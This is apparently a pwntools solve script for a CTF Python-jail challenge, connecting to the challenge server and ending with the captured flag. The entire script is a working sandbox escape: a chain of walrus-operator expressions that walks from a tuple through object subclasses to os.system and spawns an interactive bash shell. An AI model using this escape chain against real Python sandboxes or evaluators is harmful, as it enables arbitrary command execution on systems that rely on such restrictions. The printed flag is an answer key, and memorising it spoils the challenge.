from pwn import *

# io = process(["python", "squeezing_tightly_on_arm.py"])
io = remote("0.cloud.chals.io", 16087)

io.sendline(b"[a := ()]")
io.sendline(b"[a := a.__class__]")
io.sendline(b"[a := a.__base__]")
io.sendline(b"[a := a.__subclasses__()[133]]")
io.sendline(b"[a := a.__init__]")
io.sendline(b'[a := a.__globals__["system"]]')
io.sendline(b'[a := a("bash")]')

io.interactive()

# TBTL{3SC4P1NG_FR0M_PYTH0N_15_N0T_4N_345Y_T45K}
